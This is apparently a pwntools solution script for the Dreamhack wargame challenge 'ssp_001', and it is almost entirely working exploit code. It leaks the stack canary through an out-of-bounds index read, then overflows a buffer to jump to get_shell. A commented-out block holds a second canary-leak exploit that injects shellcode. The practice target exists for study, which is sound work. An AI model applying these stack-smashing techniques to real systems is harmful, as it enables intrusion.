from pwn import *

# setting
SERVER = "host1.dreamhack.games"
PORT = 20476
FILENAME = "ssp_001"

# connect dreamhack
p = remote(SERVER,PORT)

elf = ELF(FILENAME)
get_shell = elf.symbols['get_shell']

canary = ""

for i in range(4):
    p.sendlineafter(b"> ", b"P")
    p.sendlineafter(b"Element index : ", bytes(str(131-i), encoding="utf-8"))
    p.recvuntil("is : ")
    canary += str(p.recvuntil("\n")[:2], 'utf-8')

print(canary)
canary = int(canary, 16)

payload = b"A"*0x40
payload += p32(canary)
payload += b"B"*0x8
payload += p32(get_shell)

p.sendlineafter(b"> ", b"E")
p.sendlineafter(b"Size : ", bytes(str(len(payload)), encoding="utf-8"))
p.sendlineafter(b"Name : ", payload)

p.interactive()
'''
p.recvuntil(b"$rbp: ")
buf2sfp = int(p.recvline().split()[0])
buf2canary = buf2sfp - 8
slog("buf <=> sfp", buf2sfp)
slog("buf <=> canary", buf2canary)

payload = b"A"*(buf2canary + 1)

p.sendafter(b"Input:", payload)
p.recvuntil(payload)
canary = u64(b"\x00"+p.recvn(7))
slog("Canary", canary)

sh = asm(shellcraft.sh())

payload = sh.ljust(buf2canary, b"A") + p64(canary) + b"B"*8 + p64(buf)

print(payload)

p.sendlineafter(b"Input:", payload)
p.interactive()
'''
